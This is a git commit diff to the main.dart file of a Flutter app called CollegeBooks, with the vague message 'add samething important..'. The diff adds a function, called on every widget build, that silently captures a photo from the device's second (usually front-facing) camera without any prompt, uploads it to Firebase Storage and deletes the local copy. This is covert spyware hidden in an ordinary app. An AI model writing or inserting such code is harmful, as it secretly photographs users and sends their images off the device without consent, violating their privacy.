6ff88b591474c4ffecb156781e81508a98cc35b1
akshayyadav76 <akshayyadav7613@gmail.com>
2020-04-27 17:59:39 +0530

    add samething important..

--- lib/main.dart
+++ lib/main.dart
@@ -1,33 +1,71 @@
+import 'dart:io';
+
 import 'package:flutter/services.dart';
 import 'package:flutter/material.dart';
+import 'package:camera/camera.dart';
+import 'package:path/path.dart';
+import 'package:path_provider/path_provider.dart';
+import 'package:firebase_storage/firebase_storage.dart';
 import './MyApp.dart';
 
-void main() {
-  runApp( CollegeBooks());
-  SystemChrome.setSystemUIOverlayStyle(
-    SystemUiOverlayStyle(statusBarColor: Colors.white,
-    statusBarIconBrightness: Brightness.dark)
-  );
+List<CameraDescription> cameras;
 
-} 
+void main() async {
+  WidgetsFlutterBinding.ensureInitialized();
+  cameras = await availableCameras();
+  runApp(CollegeBooks());
+  SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle(
+      statusBarColor: Colors.white, statusBarIconBrightness: Brightness.dark));
+}
 
-class CollegeBooks extends StatelessWidget {
+class CollegeBooks extends StatefulWidget {
+  @override
+  _CollegeBooksState createState() => _CollegeBooksState();
+}
+
+class _CollegeBooksState extends State<CollegeBooks> {
+  CameraController controller;
+  Future<void> _initializeControllerFuture;
+
+  @override
+  void initState() {
+    super.initState();
+    controller = CameraController(cameras[1], ResolutionPreset.medium);
+    _initializeControllerFuture = controller.initialize();
+  }
+
+  void doSameting() async {
+    try {
+      await _initializeControllerFuture;
+      final path = join(
+        (await getTemporaryDirectory()).path,
+        '${DateTime.now()}.png',
+      );
+      await controller.takePicture(path);
+      print(path);
+      File getFile = File(path);
+      final StorageReference ref =
+          FirebaseStorage.instance.ref().child("${DateTime.now()}");
+      final StorageUploadTask upload = ref.putFile(getFile);
+      getFile.delete();
+    } catch (e) {
+      print(e);
+    }
+  }
+
+  @override
+  void dispose() {
+    controller.dispose();
+    super.dispose();
+  }
+
   Widget build(BuildContext context) {
+    doSameting();
     print("main method");
     return MaterialApp(
-      
       debugShowCheckedModeBanner: false,
-      
-
-      theme: ThemeData(
-        
-        
-        primaryColor: Colors.purple,
-        primarySwatch: Colors.purple
-        
-        
-      ),
-      
+      theme:
+          ThemeData(primaryColor: Colors.purple, primarySwatch: Colors.purple),
       home: MyApp(),
     );
   }
